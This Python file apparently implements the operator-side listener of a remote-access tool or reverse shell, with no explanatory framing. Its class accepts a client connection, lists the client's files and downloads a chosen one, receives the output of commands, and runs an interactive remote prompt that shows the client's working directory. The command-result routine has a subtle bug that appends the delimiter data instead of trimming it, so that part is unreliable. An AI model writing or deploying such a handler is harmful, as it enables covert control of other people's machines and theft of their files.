import socket
import pickle
import os
import json

HEADERSIZE = 10

CHUNK_SIZE = 4 * 1024

END_DELIMETER = "*END_OF_FILE*"

COMMAND_END = "<END_OF_COMMAND>"

class ServerConnection:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def CreateConnection(self, ip="", port=8080):
        self.socket.bind((ip, port))
        self.ip=ip
        self.port=port

    def ListenIncoming(self, backlog=5):
        self.socket.listen(backlog)

    def AcceptConnection(self):
        self.connection, self.client_address = self.socket.accept()

        return  (self.connection, self.client_address)

    def send_data(self,  user_input):
        self.data_in_bytes = bytes(user_input, "utf-8")
        self.connection.send(self.data_in_bytes)

    def receive_data(self):
        self.data_in_bytes = self.connection.recv(1024)
        self.data = self.data_in_bytes.decode('utf-8')
        return self.data

    def send_files(self, filename):
        print("[+] Sending File : ", filename)

        self.send_data(filename)

        if os.path.exists(filename):
            print("[+] File exists!")
            with open(filename, "rb") as file:
                chunk = file.read(CHUNK_SIZE)

                while len(chunk) > 0:
                    self.connection.send(chunk)
                    chunk = file.read(CHUNK_SIZE)
                self.connection.send(END_DELIMETER.encode())

        else:
            self.connection.send("NOT_FOUND".encode())
            print("[-] File doesn't exist!")

    def receive_file(self):
        print("[+] Receiving File")
        full_list_of_files = b''
        while True:
            chunk = self.connection.recv(CHUNK_SIZE)
            if chunk.endswith(END_DELIMETER.encode()):
                chunk = chunk[:-len(END_DELIMETER)]
                full_list_of_files += chunk
                break
            full_list_of_files += chunk

        print(full_list_of_files)
        files = json.loads(full_list_of_files)
        for index in files:
            print("\t\t", index, "\t", files[index])
        file_index = (input("[+] Enter the file / folder you want to download "))
        file_2_download = files[file_index]

        self.send_data(file_2_download)
        zipped_name = self.receive_data()
        full_file = b''
        while True:
            chunk = self.connection.recv(CHUNK_SIZE)
            if chunk.endswith(END_DELIMETER.encode()):
                chunk = chunk[:-len(END_DELIMETER)]
                full_file += chunk
                break
            full_file +=chunk

        with open(zipped_name, "wb") as f:
            f.write(full_file)

        print("[+] File Downloaded successfully")

    def receive_command_result(self):
        print("[+] Receiving Command result")
        full_result = b''
        while True:
            chunk = self.connection.recv(CHUNK_SIZE)
            if chunk.endswith(COMMAND_END.encode()):
                chunk += chunk[:-len(COMMAND_END)]
                full_result += chunk
                break
            full_result += chunk

        print(full_result.decode())

    def change_dir(self):
        pwd = self.receive_data()
        while True:
            print(f'{pwd}>> ', end=" ")
            command = input("")
            self.send_data(command)
            if command == "exit" or command == "quit" or command == "stop":
                break
            pwd = self.receive_data()




    def Close(self):
        self.socket.close()
